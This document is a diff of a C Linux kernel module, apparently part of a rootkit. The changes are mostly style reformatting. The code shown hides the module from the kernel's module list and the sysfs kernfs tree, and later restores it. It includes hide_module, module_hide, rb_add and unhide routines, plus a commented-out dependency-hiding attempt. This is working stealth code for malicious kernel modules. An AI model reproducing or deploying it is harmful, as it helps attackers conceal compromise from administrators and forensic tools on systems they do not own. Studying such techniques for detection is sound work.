@@ -10,18 +10,17 @@ struct data_node *dependencies = NULL;
 /* module status */
 static int module_is_hidden = 0;
 
-void hide_module(struct module *mod) {
-
+void hide_module(struct module *mod)
+{
 	struct kernfs_node *node = mod->mkobj.kobj.sd;
 
 	if(mod == THIS_MODULE) {
-
 		/* backup previous entry of module list */
 		mod_prev = mod->list.prev;
 	}else{
-
 		/* dependencies */
-		struct module_node *mod_node = kmalloc(sizeof(struct module_node), GFP_KERNEL);
+		struct module_node *mod_node;
+		mod_node = kmalloc(sizeof(struct module_node),GFP_KERNEL);
 
 		mod_node->mod = mod;
 		mod_node->mod_next = mod->list.next;
@@ -37,19 +36,20 @@ void hide_module(struct module *mod) {
 	node->rb.__rb_parent_color = (unsigned long)(&node->rb);
 }
 
-void hide_dependencies(struct module *mod) {
-
-	/*
-	 * does not work, cause unknown.
+void hide_dependencies(struct module *mod)
+{
+	/* does not work, cause unknown.
 	 * maybe we need to work with "struct module_use", but since there's no
-	 * further explanation on the web and in the books, we let it slide for now
+	 * further explanation on the web and in the books, we let it slide for 
+	 * now
 
 	struct list_head *pos;
 	struct list_head *used_by = &mod->target_list;
 
 	list_for_each(pos, used_by) {
 
-		struct module *dependency = list_entry(pos, struct module, source_list);
+		struct module *dependency = list_entry(pos, struct module, 
+			source_list);
 
 		hide_module(dependency);
 	}
@@ -58,12 +58,11 @@ void hide_dependencies(struct module *mod) {
 	hide_module(mod);
 }
 
-void module_hide(void) {
+void module_hide(void)
+{
 
-	if(module_is_hidden) {
-
+	if(module_is_hidden)
 		return;
-	}
 
 	/* hide this particular module */
 	hide_module(THIS_MODULE);
@@ -89,33 +88,31 @@ void module_hide(void) {
 	module_is_hidden = 1;
 }
 
-int nodecmp(struct kernfs_node *kn, const unsigned int hash, const char *name, const void *ns) {
-
+int nodecmp(struct kernfs_node *kn, const unsigned int hash, const char *name, 
+	const void *ns)
+{
 	/* compare hash value */
-	if(hash != kn->hash) {
+	if(hash != kn->hash)
 		return hash - kn->hash;
-	}
 
 	/* compare ns */
-	if(ns != kn->ns) {
+	if(ns != kn->ns)
 		return ns - kn->ns;
-	}
 
 	/* compare name */
 	return strcmp(name, kn->name);
 }
 
-void rb_add(struct kernfs_node *node) {
-
-	/*
-	 * this code is a slight modification from:
-	 * http://lxr.free-electrons.com/source/Documentation/rbtree.txt
-	 */
+/*
+ * this code is a slight modification from:
+ * http://lxr.free-electrons.com/source/Documentation/rbtree.txt
+ */
+void rb_add(struct kernfs_node *node)
+{
 	struct rb_node **child = &node->parent->dir.children.rb_node;
 	struct rb_node *parent = NULL;
 
 	while(*child) {
-
 		struct kernfs_node *pos;
 		int result;
 
@@ -131,16 +128,12 @@ void rb_add(struct kernfs_node *node) {
 		/* using result to determine where to put the node */
 		result = nodecmp(pos, node->hash, node->name, node->ns);
 
-		if(result < 0) {
-
+		if(result < 0)
 			child = &pos->rb.rb_left;
-		}else if(result > 0) {
-
+		else if(result > 0)
 			child = &pos->rb.rb_right;
-		}else {
-
+		else
 			return;
-		}
 	}
 	
 	/* add new node and reblance the tree */
@@ -148,50 +141,38 @@ void rb_add(struct kernfs_node *node) {
 	rb_insert_color(&node->rb, &node->parent->dir.children);
 	
 	/* needed for special cases */
-	if (kernfs_type(node) == KERNFS_DIR) {
+	if (kernfs_type(node) == KERNFS_DIR)
 		node->parent->dir.subdirs++;
-	}
 }
 
-void unhide_module(struct module *mod, struct list_head *head) {
-
-	if(mod == THIS_MODULE) {
-
-		/* add module back in module list */
+void unhide_module(struct module *mod, struct list_head *head)
+{
+	if(mod == THIS_MODULE)
 		list_add(&mod->list, head);
-	}else{
-
-		/* don't know why but this apparently works fine... */
+	else
 		list_add_tail(&mod->list, head);
-	}
 
 	/* add module back in rbtree */
 	rb_add(mod->mkobj.kobj.sd);
 }
 
-void unhide_dependencies(struct data_node *deps) {
-
+void unhide_dependencies(struct data_node *deps)
+{
 	struct module_node *mod_node = (struct module_node *)deps->data;
-
 	unhide_module(mod_node->mod, mod_node->mod_next);
-
 	kfree(mod_node);
 }
  
-void module_unhide(void) {
-
+void module_unhide(void)
+{
 	/* check if module is already visible */
-	if (!module_is_hidden) {
+	if (!module_is_hidden)
 		return;
-	}
 
 	/* unhide dependencies */
 	free_data_node_list_callback(&dependencies, unhide_dependencies);
-
-	/* unhide our module */
+	
 	unhide_module(THIS_MODULE, mod_prev);
-
-	/* set module to visible */
 	module_is_hidden = 0;
 }
 
